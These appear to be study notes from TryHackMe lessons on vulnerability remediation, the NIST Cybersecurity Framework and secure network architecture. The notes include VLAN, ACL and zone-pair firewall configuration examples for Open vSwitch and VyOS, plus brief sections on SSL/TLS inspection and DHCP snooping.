![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ca69545bf5607ecf37477c47a0c52f4e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ca69545bf5607ecf37477c47a0c52f4e.png)

*Click to enlarge the image.*

Before
 reporting a vulnerability for remediation, it is highly advised to 
confirm that it is not a false positive since vulnerability scanners are
 prone to such errors. While some vulnerabilities might be 
straightforward to confirm, such as those identified with default 
credentials that could be easily verified remotely, others might require
 some effort remotely or from the client end. In any case, when a 
vulnerability is identified as a false positive, it is recommended to 
flag it in the report in the tool for future reference.

**Vulnerability Management Life Cycle - Remediate & Verify**

# Step 5: Remediation

This
 phase involves fixing the vulnerabilities discovered earlier, beginning
 with the most severe ones. The identified vulnerabilities should be 
reported to the concerned stakeholders for remediation. A few approaches
 are available to organisations for dealing with known vulnerabilities 
and configuration errors. **Remedial action, such as thoroughly addressing or patching vulnerabilities, is the best course of action**.
 If complete remediation is not feasible, businesses might mitigate, 
which entails lowering the risk of exploitation or minimising the 
potential harm. Finally, security engineers can acknowledge their 
vulnerability, for instance, when the risk involved is low, and choose 
to do nothing.

Now that we are aware of the most critical 
vulnerabilities in the organisation, it is time to report them to the 
stakeholders for remediation. For this purpose, we will create a ticket 
for the `PHP` vulnerability and assign it to the responsible team. Tickets in the GVM can be created from the `Detail View` GUI of the corresponding vulnerability, as shown below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/18e6a5f43ab471f32eba382467ae885f.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/18e6a5f43ab471f32eba382467ae885f.gif)

The responsible team received the ticket and will resolve the issue by upgrading `PHP` to the latest version. Once they resolved it, they will change the status to **Fixed**. The remediation ticket's status can be tracked from the `Resilience > Remediation Tickets` menu, as shown below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/35041ae52bb427241d523db8ca17c9f9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/35041ae52bb427241d523db8ca17c9f9.png)

*Click to enlarge the image.*

# Step 6: Verification & Monitoring

In
 the last step of vulnerability management, regular audits and process 
monitoring are used to guarantee that all threats have been eradicated.

For
 this purpose, we will rescan the target after applying the fix. If the 
results are satisfactory, we will close the remediation ticket.

**Vulnerability Management Framework**

This task will briefly discuss a renowned framework used worldwide for vulnerability management. The [National Institute of Standards and Technology (NIST)](https://www.nist.gov/) created the [Cybersecurity Framework (CSF)](https://www.nist.gov/cyberframework) as
 a guidance for organisations to better manage and reduce their 
cybersecurity risks. The NIST Cybersecurity Framework is intended as a 
comprehensive cyber strategy and has become a helpful risk management 
resource for corporate sector businesses and government entities. The 
fundamental components of the NIST Cybersecurity Framework are broken 
down into five areas applicable to vulnerability management that help to
 achieve the cybersecurity objectives of an organisation.

- **Identify**: What assets and processes require security?
- **Protect:** Put the right security measures in place to protect the organisation's assets.
- **Detect:** Implement adequate procedures to detect cybersecurity events.
- **Respond**: Develop methods for mitigating the effects of cybersecurity incidents.
- **Recover**: Implement the proper procedures for restoring capabilities and services impacted by cybersecurity incidents.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5216171b0dc191461e4efecb2fc8da8d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5216171b0dc191461e4efecb2fc8da8d.png)

The
 NIST CSF comprises guidelines, standards, and best practices for 
managing cybersecurity risk. In recent years, it gained immense 
popularity, and many organisations now employ the CSF to govern their 
cybersecurity state. Even though the NIST CSF has a broader range of 
applications, let's examine how to exploit its fundamental elements for 
vulnerability management.

# Identify

The
 framework's first and foremost objective is to provide a solid basis 
for a cybersecurity program. This stage addresses the query, "**What assets require protection?**" in the context of vulnerability management. This phase may involve the following steps:

- **Develop asset discovery methodologies**: You cannot safeguard what you do not know. Implement the required tools and procedures to achieve complete insight over enterprise assets,
including those on-premises and cloud assets.
- **Discover assets in real-time:** The process of discovering assets should be automated to get a near
real-time picture of all the assets within the organisation.
- **Ascertain the criticality of assets:** Adding security and business relevance to the assets would assist you
in prioritising their significance to your business. It's crucial to
analyse as much data as possible. Unfortunately, most companies use a
subjective method to estimate the importance of their assets to the
business. They tend to make cybersecurity decisions based on intuition
rather than data, which yields poor results.

# Protect

This
 phase encompasses limiting or reducing the effects of a potential cyber
 incident and deploying the appropriate safeguards to secure the 
provision of IT infrastructure services. For vulnerability management, 
this phase addresses the query, "**Have you adopted the necessary measures to secure the assets of your organisation?**" This phase may involve the following steps:

- **Deploy security safeguards**: Make use of security systems and technology, and follow best practices, including proactive security (email security, network security, ransomware and anti-malware protection), preventative security (encryption, regular backups) and Information Security Management Systems (ISMS) (patch management solutions, Identity Access Management (IAM), Security Information and Event Management (SIEM), and Data Loss Prevention (DLP)).
- Deploy vulnerability management software.

# Detect

This
 phase outlines the operations performed to promptly recognise a 
cybersecurity incident's presence. To vulnerability management, this 
stage addresses the query, "**Have you put in place suitable measures to discover security vulnerabilities?**" This phase may involve the following steps:

- **Detect vulnerabilities**: After you have mapped the attack surface, you must implement tools and
methods to detect vulnerabilities and shortcomings in the IT
infrastructure. Discovering vulnerabilities is a crucial part of a
program for managing vulnerabilities.
- **Prioritise vulnerabilities**: Since every enterprise has a large number of vulnerabilities, it is
essential to prioritise vulnerabilities for remediation, ensuring that
the responsible team takes adequate measures to fix vulnerabilities
based on their priority.
- **Quantify risks:** Once
vulnerabilities are prioritised, the associated risks can be quantified
by assigning a score to each vulnerability, which can be customised
based on the organisation's mission. Estimating cyber risk in quantified terms gives a consistent vocabulary for prioritising initiatives and
tracking the efficacy of the overall cybersecurity program.
- **Monitor constantly**: Implement tools for continuous monitoring to detect newly found
vulnerabilities, new assets, and other changes in your environment.

# Respond

This
 stage emphasises the steps required once a cybersecurity vulnerability 
has been identified. This process addresses the query: "**Have you implemented the necessary techniques and mechanisms to mitigate the vulnerability's impact?**" This phase may involve the following steps:

- **Define ownership**: It is essential to determine who is responsible for addressing each
vulnerability. Clarity regarding ownership warrants accountability and
encourages action.
- **Establish reporting**: Reports present
relevant stakeholders with the extent of vulnerabilities that have been
identified. Creating risk-owner-specific reports enables progress
comparisons. Leaderboards, warnings, and reminders can be utilised to
encourage the concerned team member to fulfil their responsibilities for the assigned duties.
- **Share status regularly**: Provide stakeholders with timely updates on the remedial queue. A further part
of status sharing is the ability to provide reports that demonstrate
progress on risk mitigation and the commercial value the security
program is bringing.
- **Adopt a risk acceptance approach**:
Swiftly eliminating all discovered vulnerabilities is impossible. There
could be circumstances where business-critical assets must be taken
offline to address a vulnerability. One should establish a strategy for
risk acceptance based on risk threshold and business requirements.
- **Establish remedial measures**: During normal operations, security teams should concentrate on
eradicating large quantities of critical vulnerabilities and eliminating security holes swiftly and effectively. However, when adversaries
actively exploit a newly discovered critical vulnerability, the security team should focus on finding and releasing patches or swift mitigations to address these severe vulnerabilities.

# Recover

This
 is the final step of the NIST CSF. This phase entails updating and 
strengthening resilience plans and restoring any compromised 
capabilities or services caused by a cybersecurity event. For 
vulnerability management, it addresses the query, "**Have you implemented the processes and technologies necessary for detecting and resolving future vulnerabilities?**" This phase may involve the following steps:

- **Implement sophisticated search capabilities**: Having the power to look for affected assets is one of the preventive
measures required for vulnerability management remediation. In the
detect stage, you must be able to quickly and precisely identify all
compromised assets. Similarly, you should be able to confirm that
vulnerability occurrences have been addressed during the Recover phase.
- **Extend security to unmanaged areas**: The expanding use of cloud infrastructure fuels the explosion of attack surfaces within organisations. In the recovery stage, it may be
required to increase insight across conventional assets (e.g. laptops,
desktops) and assets not currently covered by your solutions (e.g. IoT
devices, cloud assets). A Cyber ****Asset Attack Surface Management (CAASM) solution can fill this void and offer your organisation an accurate and almost real-time picture of its assets.
- **Record lessons**: Revise your procedures to take account of the learnings from security events and improve the current cybersecurity strategy.

**COnclusion**

Implementing a program for vulnerability management is all about risk
 management. By implementing a well-defined program, a company can gain a
 continuous perspective of the risk posed by security vulnerabilities in
 its IT infrastructure. It enables **management to make well-informed decisions regarding the risk-reduction measures** that could be undertaken.

Any
 organisation that wishes to understand the security threats posed by 
the technology it employs should implement a vulnerability management 
program. **Implementing a new vulnerability management approach within an enterprise can be challenging for a security engineer**. Various factors must be considered to ensure the success of a vulnerability management program, like choosing a **vulnerability scanning technique**
 that meets the organisation's demands or configuring and fine-tuning 
the vulnerability scanning technology. Finally, it is advised that early
 vulnerability scans be limited in scope when beginning vulnerability 
management. This stops initial scans from finding a large number of 
vulnerabilities. A preferable strategy would be only to **select a small range of vulnerabilities** (such as OWASP Top 10) or just those issues that the vulnerability scanning program identifies as **High** severity .

## **SECURE NETWORK ARCHITECTURE**

**Introduction**

Networking is one of 
the most critical components of a corporate environment but can often be
 overlooked from a security standpoint. A properly designed network 
permits not only internet usage and device communication but also 
redundancy, optimization, and security.

In a well-designed network, if a switch goes down, then packets can 
be redistributed through another route with no loss in uptime. If a web 
server is compromised, it cannot traverse the network and access 
important information. A system administrator should be confident that 
their servers are secure if a random device joins a network, knowing 
that the device is segmented from the rest of the network and cannot 
access those systems.

All of these concepts and scenarios are what separate a functional network from a well-designed network.

**Network Segmentation**

### The Need for Secure Segmentation

Subnets
 seem to solve all problems a network may face; why would we use another
 solution? To answer this question, let’s consider a scenario where a 
client brings in their own device, a common practice known as **BYOD** (**B**ring **Y**our **O**wn **D**evice).
 The client’s device was infected with a Remote Access Trojan (RAT) that
 will attempt to traverse the network the device is connected to and 
exfiltrate any sensitive information. With subnetting in place, there is
 no restriction in place as to where the infected device could connect 
as long as the proper routes are in place, leaving sensitive information
 and servers open to the unknown device. How do we fix this problem? VLANs!

**VLANs** (**V**irtual **LAN**) are used to segment portions of a network at layer two and differentiate devices.

VLANs are configured on a switch by adding a "tag" to a frame. The **802.1q** or **dot1q** tag will designate the VLAN that the traffic originated from.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/922c8b652a916ec056dcc5ebc65fee00.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/922c8b652a916ec056dcc5ebc65fee00.png)

The
 802.1 tag provides a standard between vendors that will always define 
the VLAN of a frame. For example, if our switches are Cisco and our 
routers are Juniper, they can send tagged frames and digest them equally
 because it is standardized. As a demonstration, we will show how to configure tags on the interfaces of a switch.

In this example, we will use the open-source switch: [**Open vSwitch**](https://www.openvswitch.org/)

Let's first look at the default configuration of the switch.

```
$ ovs-vsctl show

```

To add a VLAN and tags to a sub-interface, we need to modify the configuration through `ovs-vsctl`

```
$ ovs-vsctl set port <interface> tag=<0-99>

```

The tag should now be listed under the sub-interface in the configuration.

```bash
Port eth1
		tag: 10
		Interface eth1

```

We now have our first interfaces configured to tag their
 frames! But what if we don't know where the VLAN traffic originates 
from? For example, traffic from virtualized devices or network traffic.

# Tagging Unknown Traffic

The **Native VLAN**
 is used for any traffic that is not tagged and passes through a switch.
 To configure a native VLAN, we must determine what interface and tag to
 assign them, then set the interface as the default native VLAN. Below 
is an example of adding a native VLAN in Open vSwitch.

```
$ ovs-vsctl set port eth0 tag=10 vlan_mode=native-untagged

```

Now all traffic should be tagged, even with unknown origins.

# Routing Between VLANs

But
 how does a VLAN connect to the internet or access resources in other 
VLANS? Since they are segmented, they cannot communicate outside their 
tagged devices. Just as routers are used to communicate between 
traditional networks, routers can be used to route between VLANs.

Before
 modern solutions were introduced, network engineers would physically 
connect a switch and router separately for each VLAN present. Nowadays, 
that problem is solved through the **ROAS** (**R**outer **o**n **a S**tick) design. VLANs are configured to communicate with a router through a designated interface of a switch, known as a **switch port**. The connection between the switch and router is known as a **trunk**. VLANs are routed through the switch port, requiring only one trunk/connection between the switch and router, hence, "*on a stick*."

Before
 configuring the router, we must configure a trunk on a pre-existing 
connection. In our demonstration lab environment, trunks are configured 
by default as **bridges**. Each vendor configures their 
trunks and switch ports differently, some even with propriety protocols;
 please refer to their specific documentation.

Below is an example of adding a new bridge and interface to create a trunk.

```
$ ovs-vsctl add-br br0

```

```
$ ovs-vsctl add-port br0 eth0 tag=10

```

Now, we can configure our router to route tagged traffic
 between VLANs. Remember, as mentioned when we introduced tags because 
the 802.1q tag is standardized, we only need to tell our router how to 
configure its switch port and what tags to accept for each interface.

Because
 all tagged traffic comes from a single connection, the router must be 
able to keep each tagged frame separate. This is accomplished using **virtual sub-interfaces**;
 these will act similar to physical interfaces and are commonly defined 
by the VLAN ID; the syntax for sub-interfaces is commonly,

```
<name>.<vlan/sub-interface id>
```

Below is an example of adding a new virtual sub-interface and configuring its corresponding addressing.

In this example, we will use the open-source router: [**VyOS**](https://vyos.io/)

```
vyos@vyos-rtr# set interfaces ethernet eth0 vif 10 description 'VLAN 10'

```

```
vyos@vyos-rtr# set interfaces ethernet eth0 vif 10 address '192.168.100.1/24'

```

If all went well and was appropriately configured, we 
should be able to route traffic between VLANs while keeping traffic 
tagged and isolated!

But are they really isolated? Physically, 
they are isolated, but because routes exist between them, there is no 
security boundary, and they are not necessarily isolated. As long as a 
route exists between two VLANs, any device can communicate between the 
two.

This brings us to our following two tasks, where we will discuss designing secure VLANs and introduce the concept of zoning.

# Analyzing a VLAN Configuration

Apply what you learned to analyze a VLAN configuration given the output below.

*Interface Configuration Snippet (Click to view)*

`/ # ovs-vsctl show
87c2a3ee-5374-435a-81c2-e8aafa96e3b9
    Bridge br2
        datapath_type: netdev
        Port br2
            Interface br2
                type: internal
    Bridge br1
        datapath_type: netdev
        Port br1
            Interface br1
                type: internal
    Bridge br0
        datapath_type: netdev
        Port eth9
            tag: 30
            Interface eth9
        Port br0
            Interface br0
                type: internal
        Port eth13
            tag: 30
            Interface eth13
        Port eth14
            tag: 30
            Interface eth14
        Port eth15
            tag: 30
            Interface eth15
        Port eth2
            tag: 10
            Interface eth2
        Port eth8
            tag: 30
            Interface eth8
        Port eth3
            tag: 20
            Interface eth3
        Port eth7
            tag: 30
            Interface eth7
        Port eth4
            tag: 20
            Interface eth4
        Port eth10
            tag: 30
            Interface eth10
        Port eth5
            tag: 20
            Interface eth5
        Port eth6
            tag: 30
            Interface eth6
        Port eth12
            tag: 30
            Interface eth12
        Port eth0
            Interface eth0
        Port eth11
            tag: 30
            Interface eth11
        Port eth1
            tag: 10
            Interface eth1
    Bridge br3
        datapath_type: netdev
        Port br3
            Interface br3`

**Common Secure Network Architecture**

With the introduction of VLANs, there is a shift in network architecture design to include security as a key consideration. **Security**, **optimization**, and **redundancy** should all be considered when designing a network, ideally without compromising one component.

This brings us to the question, how do we properly implement VLANs as a security boundary? Security zones! **Security zones** define **what** or **who** is in a VLAN and how traffic can travel **in** and **out**.

Depending on whom you speak to, every network architect may have a 
different approach/opinion to the language or requirements surrounding 
security zones. In this task, we will immerse you in the most commonly 
accepted security zone standards, keeping a minimalist approach to 
segmentation.

Below we will present you with a table of commonly standardized 
zones. This is only to familiarize you with the terminology; we will 
cover each concept in further depth throughout this room.

| **Zone** | **Explanation** | **Examples** |
| --- | --- | --- |
| External | All devices and entities outside of our network or asset control. | Devices connecting to a web server |
| DMZ (**d**e**m**ilitarized **z**one) | Separates untrusted networks or devices from internal resources. | BYOD, remote users/guests, public servers |
| Trusted | Internal networks or devices. A device may be placed in the trusted zone if there is no confidential or sensitive information. | Workstations, B2B |
| Restricted | Any high-risk servers or databases. | Domain controllers, client information |
| Management | Any
 devices or services dedicated to network or other device management. 
This zone is less commonly seen and can be grouped with the audit zone. | Virtualization management, backup servers |
| Audit | Any devices or services dedicated to security or monitoring. This zone is less commonly seen and can be grouped with management. | SIEM, telemetry |

While security zones mostly factor in what will happen internally, it
 is equally important to consider how new traffic or devices will enter 
the network, be assigned, and interact with internal systems. Most 
external traffic (HTTP, mail, etc.) will stay in the DMZ, but what if a 
remote user needs access to an internal resource? We can easily create 
rules for resources a user or device can access based on MAC, IP 
addresses, etc. We can then enforce these rules from network security 
controls; in the next task, we will discuss various access controls and 
solutions to implement policies.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/99e8ced5bc8519608ef3d95b9528cf1a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/99e8ced5bc8519608ef3d95b9528cf1a.png)

Security
 zones and access controls will physically direct how and where traffic 
goes. But how is it decided what resources users or devices have access 
to? Traffic rules are often governed by company security policy or 
compliance as equally as security controls that determine access 
permissions.

We’ve now established a system to approach designing VLANs, but 
how can we practically implement and enforce them? In the next task, we 
will cover several protocols and applications that can be used to 
implement and enforce VLANs.

**Network Security Policies and Controls**

Now that 
we have covered segmentation and secure architecture design, how do we 
enforce it? If there are routes between VLANs intended to be separated, 
how is the appropriate access restricted or granted?

Policies aid 
in defining how network traffic is controlled. A network traffic policy 
may determine how and if a router will route traffic before other 
routing protocols are employed. **IEEE** (**I**nstitute of **E**lectrical and **E**lectronics **E**ngineers) has standardized a handful of access control and traffic policies, such as **QoS** (**Q**uality **o**f **S**ervice) (**802.11e**).
 There are still many other routing and traffic policies that are not 
standardized by IEEE but are commonly used by all vendors following the 
same objectives.

This task will focus on traffic filtering and introduce network policy concepts.

# Traffic Filtering

Before
 formally defining what traffic filtering is, let’s discuss one of the 
most common standards of defining traffic filtering: **ACL(s)** (**A**ccess **C**ontrol **L**ist**(s)**).

An
 ACL is used as a loose standard to create a ruleset for different 
implementations and access control protocols. In this task, we will use 
ACLs within a router to decide whether to route or drop a packet based 
on the defined list.

An ACL contains **ACE(s)** (**A**ccess **C**ontrol **E**ntry) or rules that define a list’s profile based on pre-defined criteria (source address, destination address, etc.)

Once defined, we can use an ACL for several vendor-specific implementations. For example, [Cisco](https://www.cisco.com/c/en/us/td/docs/routers/asr9000/software/asr9k_r4-0/addr_serv/command/reference/ir40asrbook_chapter1.html#:~:text=An%20access%20control%20list%20(ACL,queueing%2C%20and%20dynamic%20access%20control.)) uses ACLs for traffic filtering, priority or custom queuing, and dynamic access control.

Formally,
 traffic filtering provides network security, validation, and 
segmentation by filtering network traffic based on pre-defined criteria.

We’ve
 now defined what traffic filtering is and how the criteria are defined.
 Let’s look at how we can implement ACLs in traffic filtering or access 
control policies.

To get hands-on, we will look at the policies 
that VyOS offers. The VyOS access-list policy is the platform’s most 
basic implementation of filtering. The policy will use ACLs or prefix 
lists to define the criteria for filtering.

Let’s break down how VyOS creates an ACL and defines the policy.

Create the new access-list policy, defining the ACL number (1 - 2699)

`set policy access-list <acl_number>`

Set the description of the access list.

`set policy access-list <acl_number> description <text>`

Create a new rule (or ACE) under the ACL and define the action of the rule.

`set policy access-list <acl_number> rule <1-65535> action <permit|deny>`

Define criteria or parameters for the rule to enforce/match.

`set policy access-list <acl_number> rule <1-65535> <destination|source> <any|host|inverse-mask|network>`

At this point, we have an ACL and an ACE that is actively being enforced by the router.

Let’s
 recap, the ACL is defined as an ACL number and is made of separate 
rules or ACEs that describe the behavior of the ACL. Each ACE can 
determine the action, destination/source, and the specific address/range
 to trigger the ACE.

Below is a diagram showing a valid SSH request permitted by the ACL.

```c
Internet Protocol Version 4, Src: 10.10.212.209, Dst: 10.10.212.209
    Protocol: TCP (6)
    Header checksum: 0xbfdd [validation disabled]
    [Header checksum status: Unverified]
    Source: 10.10.212.209
    Destination: 10.10.212.209
Transmission Control Protocol, Src Port: 35560, Dst Port: 22, Seq: 1578, Ack: 1670, Len: 148
    Source Port: 35560
    Destination Port: 22
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/1216b5a727fbef4a4409efa6e18c7bbf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/1216b5a727fbef4a4409efa6e18c7bbf.png)

`set policy access-list 1 rule 1 action permit`

`set policy access-list 1 rule 1 source 10.10.212.209`

Below is a diagram showing an invalid SSH request denied by the ACL.

```c
Internet Protocol Version 4, Src: 10.10.212.209, Dst: 10.10.212.209
    Protocol: TCP (6)
    Header checksum: 0xbfdd [validation disabled]
    [Header checksum status: Unverified]
    Source: 10.10.212.209
    Destination: 10.10.212.209
Transmission Control Protocol, Src Port: 35560, Dst Port: 22, Seq: 1578, Ack: 1670, Len: 148
    Source Port: 35560
    Destination Port: 2
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ec53514c7c32bb65cd3bb6c21404e60f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ec53514c7c32bb65cd3bb6c21404e60f.png)

`set policy access-list 1 rule 1 action deny`

`set policy access-list 1 rule 1 source 10.10.212.209`

If correctly implemented, the router should now drop or accept packets based on their source or destination address.

But
 is this the best solution? Recapping what was covered in task 3, what 
if we want a public web server in the DMZ and ensure that only HTTP 
traffic originates from it? What if specific hosts need specific 
protocols to be open on a server? A router can only provide a limited 
amount of extensibility for security.

In the next task, we will continue answering this question and look at how we may approach solutions for this problem.

# Analyzing Packets and ACLs

Now
 that we understand the structure of an ACL and what it will look for in
 a packet, let’s analyze a few packets and ACL policies to determine if 
they will be accepted or dropped.

Below is each packet and ACL policy required; answer the questions using the resources below.

*Packet #1 (Click to view)*

`Internet Protocol Version 4, Src: 10.10.212.209, Dst: 10.10.212.209
    Protocol:TCP (6)
    Header checksum: 0xbfdd [validation disabled]
    [Header checksum status: Unverified]
    Source: 10.10.212.209
    Destination: 10.10.212.209
Transmission Control Protocol, Src Port: 35560, Dst Port: 22, Seq: 1578, Ack: 1670, Len: 148
    Source Port: 35560
    Destination Port: 22`

*ACL Policy #1 (Click to view)*
`set policy access-list 1 rule 1 action permit`
`set policy access-list 1 rule 1 source 255.255.255.0`
`set policy access-list 1 rule 1 source 10.10.212.0/24`

*Packet #2 (Click to view)*

`Internet Protocol Version 4, Src: 10.10.212.200, Dst: 10.10.212.209
    Protocol:TCP (6)
    Header checksum: 0xbfdd [validation disabled]
    [Header checksum status: Unverified]
    Source: 10.10.212.209
    Destination: 10.10.212.209
Transmission Control Protocol, Src Port: 35560, Dst Port: 22, Seq: 1578, Ack: 1670, Len: 148
    Source Port: 35560
    Destination Port: 2`

*ACL Policy #2 (Click to view)*
`set policy access-list 1 rule 1 action deny`
`set policy access-list 1 rule 1 destination 10.10.212.209`

**Zone-Pair Policies and Filtering**

Picking
 back up from the questions asked in the previous task, we must first 
understand what we are considering. Network considerations often include
 size, traffic, and data correlation; when considering protocols and the
 requirements of a zone, we need to shift our focus toward traffic and 
correlation.

Traffic correlation is standardized as the state of a packet, e.g. (protocol, process, direction, etc.)

We must employ a firewall to parse the state of a packet and enforce policies based on that state.

# Firewalls

At the highest level, basic network firewalls are defined in two categories: **stateless** vs. **stateful**.
 A protocol's category is determined based on its ability to consider 
the state of a packet. For example, the ACLs used in the previous task 
would be regarded as a stateless protocol.

A stateful firewall can
 better correlate information in a network connection. This allows the 
firewall to filter based on protocols, ports, processes, or other 
information from a device, etc. For more information about check the [Extending Your Network room](https://tryhackme.com/room/extendingyournetwork).

Before
 configuring a firewall, we need to consider how we can apply the 
requirements of zones to firewall rules. How can we define different 
actions based on the protocol and source/destination zone? **Zone-pairs**!

# Zone-Pairs

**Zone-pairs**
 are a direction-based and stateful policy that will enforce the traffic
 in single directions per each VLAN, hence, zone-pair. For example, **DMZ → LAN** or **LAN → DMZ.**

Each
 zone in a given topology must have a different zone-pair for each other
 in the topology and every possible direction. This approach provides 
the most visibility from a firewall and drastically improves the 
filtering capabilities.

In this task, we will use VyOS as an example of configuring a firewall for zone-pairing.

Before defining each pair's zoning policy, we must add a common name and default action for each VLAN.

Recall from task two that VLANs are routed through a trunk and divided through sub-interfaces. The syntax is `<interface>.<VLAN #>` e.g. `eth0.30`

Below is an example of setting a default action for the DMZ and assigning the VLAN to the common zone name.

1. `set zone-policy zone dmz default-action drop`
2. `set zone-policy zone dmz interface eth0.30`

Repeat this process for each VLAN interface or zone defined in a network.

Now we can begin addressing each zone-pair direction. For this task, we will be referencing the topology below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/e7af1be010220560bbb182fcbd57ebe9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/e7af1be010220560bbb182fcbd57ebe9.png)

Each
 zone will have a corresponding pair to every other zone. To define each
 zone-pair, we will write down each possible pair and protocols or 
actions that we may apply to the zone-pair.

Below is an example table of each zone-pair in the above topology and what possible protocols/actions may look like.

| **Zone A** | **Zone B** | **Protocol** | **Action** |
| --- | --- | --- | --- |
| LAN | WAN | ICMP | Drop |
| LAN | LOCAL | - | - |
| LAN | DMZ | - | - |
| WAN | LAN | ICMP | Accept |
| WAN | LOCAL | - | - |
| WAN | DMZ | - | - |
| LOCAL | LAN | - | - |
| LOCAL | WAN | - | - |
| LOCAL | DMZ | - | - |
| DMZ | LAN | HTTP | Accept |
| DMZ | WAN | - | - |
| DMZ | LOCAL | - | - |

This gives us a good understanding of the expected behavior of our network and a good plan to begin configuring the firewall.

**Remember:** Not all traffic is IPv4! Depending on your network configuration, you may also need to configure IPv6 rules!

Because
 of the default action that we set, any protocols that originate on the 
network and are not defined will be dropped by default.

We will 
not go over each ruleset and zone-pair; instead, we will cover one 
zone-pair in each direction and test that the behavior works as 
expected. In this example, we will configure the LAN and WAN zone-pairs.
 After the example, you'll feel confident configuring a small amount of 
the zone-pairs on your own.

For all VyOS firewall rulesets, we 
must begin by defining the default action and state rules. We will not 
cover the intricacies of this configuration as it is not the aim of this
 room. Rather than repeating seven commands to create each rule, we will
 rely on the VyOS configuration to define each rule. Below is an example
 of the base VyOS ruleset. This should be the same at the top of each 
ruleset you create.

```c
name lan-wan {
  default-action drop
  enable-default-log
  rule 1 {
    action accept
    state {
      established enable
      related enable
    }
  }
  rule 2 {
    action drop
    log enable
    state {
      invalid enable
    }
  }
}

```

Now let's add the rule for ICMP.

```c
rule 100 {
    action drop # Define the action for the rule
    log enable # Enable logging to track connection attempts in VyOS
    protocol ipv4-icmp # Protocol to monitor and enforce the action on
 }

```

Now that we have our first zone-pair ruleset, let's 
create the rules for the opposite zone-pair direction: WAN → LAN. Below 
is the ruleset required to allow ICMP traffic.

```c
name wan-lan {
  default-action drop
  enable-default-log
  rule 1 {
    action accept
    state {
      established enable
      related enable
    }
  }
  rule 2 {
    action drop
    log enable
    state {
      invalid enable
    }
  }
	rule 100 {
    action accept
    log enable
    protocol ipv4-icmp
 }
}

```

The zone-pair is now defined with appropriate actions 
and states. We can now combine the firewall ruleset with a previously 
configured zone.

**Recall:** At the beginning of this task, we configured zone policies with a corresponding interface and common name.

Below is the generic syntax for adding a zone-pair.

`set zone-policy zone <zone A> from <zone B> firewall <name> <ruleset name>`

Below we will set the zone-pair for both the LAN → WAN and WAN → LAN pairs.

1. `set zone-policy zone LAN from WAN firewall name lan-wan`
2. `set zone-policy zone WAN from LAN firewall name wan-lan`

We should have our first zone-pairs defined and enforced now. To test our new configuration, we can attempt to send a `ping` command in both directions to ensure the firewall is dropping or accepting our ICMP packets.

**Validating Network Traffic**

To begin this task, 
let’s first start with a scenario. Your organization has proper zoning 
and routes in place. A zone-pair between the DMZ and LAN allows an HTTPS
 connection. Of course, the firewall should accept these connections… 
How else is Susie supposed to watch Facebook or your azure updates 
install?

In this scenario, let’s say there is a threat actor that 
has landed an implant through phishing on a LAN machine. Assuming host 
defense mechanisms have failed, how can the implant be detected and 
monitored? If their beacon is using HTTPS through the DMZ. That will 
look like primarily legitimate traffic to your firewall and analysts.

To solve this issue, we must use SSL/TLS inspection to intercept HTTPS connections.

# SSL/TLS Inspection

SSL/TLS inspection uses an **SSL proxy**
 to intercept protocols, including HTTP, POP3, SMTP, or other SSL/TLS 
encrypted traffic. Once intercepted, the proxy will decrypt the traffic 
and send it to be processed by a **UTM** (**U**nified **T**hreat **M**anagement)
 platform. UTM solutions will employ deep SSL inspection, feeding the 
decrypted traffic from the proxy into other UTM services, including but 
not limited to web filters or **IPS** (**I**ntrusion **P**revention **S**ystem), to process the information.

This solution may seem ideal, but what are the downsides? Some of you may have already noted that this requires an SSL proxy or **MitM** (**M**an-**i**n-**t**he-**M**iddle).
 Even if a firewall or vendor has already implemented the solution, it 
will still act as a MiTM between your devices and the outside world; 
what if it intercepts potentially plain-text passwords? A corporation 
must assess the pros and cons of this solution, dependent on its 
calculated risk. You could allow all applications that you know are 
safer to prevent potential cons, but this solution will still have 
disadvantages. For example, an advanced threat actor could route their 
traffic through a cloud provider or a trusted domain.

**Addressing Common Attacks**

# DHCP Snooping

[Cisco](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst6500/ios/12-2SXF/native/configuration/guide/swcg/snoodhcp.pdf) defines **DHCP snooping** as "a security feature that acts like a firewall between untrusted hosts and trusted DHCP servers."

DHCP snooping was introduced to combat **rogue DHCP servers**; it will **validate** and **rate-limit** DHCP traffic as necessary. If a host is untrusted, its traffic will be filtered and rate-limited.

Although
 DHCP is a layer three protocol, DHCP snooping operates on the switch at
 layer two. The switch will store untrusted hosts with leased IP 
addresses in a **DHCP Binding Database**. The database is 
used to validate traffic and can be used by other protocols, such as 
dynamic ARP inspection, which we will cover later in this task.

We
 know how DHCP snooping will gather and store addresses, but how does it
 determine what to do with traffic? Below is a list of conditions the 
protocol will inspect to determine if a DHCP packet should be dropped.

- Any DHCP packet is received from outside of the network.
- The source MAC address and DHCP client hardware address do not match.
- A `DHCPRELEASE` or `DHCPDECLINE` packet is received on an untrusted interface that does not match an interface that the source address already has registered.
